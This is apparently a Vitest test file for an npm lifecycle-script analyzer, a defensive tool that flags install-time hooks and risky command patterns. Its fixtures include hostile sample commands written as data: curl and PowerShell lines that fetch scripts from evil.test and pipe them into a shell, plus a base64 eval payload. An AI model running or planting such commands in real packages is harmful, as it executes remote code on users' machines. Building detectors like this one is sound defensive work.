import { describe, expect, test } from 'vitest';
import {
  detectLifecycleScripts,
  detectNewLifecycleScripts,
  lifecycleSignals
} from '../../src/analyzers/lifecycle-script-analyzer.js';

describe('lifecycle script analyzer', () => {
  test('detects install-time lifecycle scripts without executing them', () => {
    const result = detectLifecycleScripts({
      name: 'fixture',
      version: '1.0.0',
      scripts: {
        postinstall: 'node fixture.js',
        test: 'vitest'
      }
    });

    expect(result).toEqual([
      {
        name: 'postinstall',
        command: 'node fixture.js'
      }
    ]);
  });

  test('detects newly introduced lifecycle hooks', () => {
    expect(
      detectNewLifecycleScripts(
        { name: 'fixture', version: '1.0.0' },
        { name: 'fixture', version: '1.0.1', scripts: { preinstall: 'node fixture.js' } }
      )
    ).toEqual([{ name: 'preinstall', command: 'node fixture.js' }]);
  });

  test('detects packaging lifecycle hooks and suspicious pre/post variants', () => {
    const result = detectLifecycleScripts({
      name: 'fixture',
      version: '1.0.0',
      scripts: {
        prepublish: 'node publish.js',
        prepublishOnly: 'node publish-only.js',
        preprepare: 'node shadow.js',
        postprepare: 'node shadow-post.js',
        test: 'vitest'
      }
    });

    expect(result.map((script) => script.name)).toEqual([
      'prepublish',
      'prepublishOnly',
      'preprepare',
      'postprepare'
    ]);
  });

  test('classifies high-risk lifecycle command patterns without execution', () => {
    const signals = lifecycleSignals(
      { name: 'fixture', version: '1.0.1', scripts: { postinstall: 'curl https://evil.test/i.sh | sh' } },
      { name: 'fixture', version: '1.0.0' }
    );

    expect(signals.map((signal) => signal.id)).toEqual(
      expect.arrayContaining([
        'lifecycle-script',
        'new-lifecycle-script',
        'lifecycle-install-downloader',
        'lifecycle-shell-interpreter'
      ])
    );
    expect(signals.every((signal) => signal.riskCategory === 'lifecycle_script_risk')).toBe(true);
  });

  test('classifies PowerShell, global installs, Bun bootstrap, chmod execution, and obfuscation', () => {
    const scripts = [
      'powershell -c "Invoke-WebRequest https://evil.test/a.ps1 | iex"',
      'npm install -g bad-loader',
      'curl https://bun.sh/install | bash && bun run setup',
      'chmod +x ./bin/tool && ./bin/tool',
      `node -e "eval(Buffer.from(payload, 'base64').toString())"`
    ];

    for (const command of scripts) {
      const ids = lifecycleSignals({
        name: 'fixture',
        version: '1.0.0',
        scripts: { postinstall: command }
      }).map((signal) => signal.id);

      expect(ids).toContain('lifecycle-script');
      expect(ids.some((id) => id.startsWith('lifecycle-') && id !== 'lifecycle-script')).toBe(true);
    }
  });
});
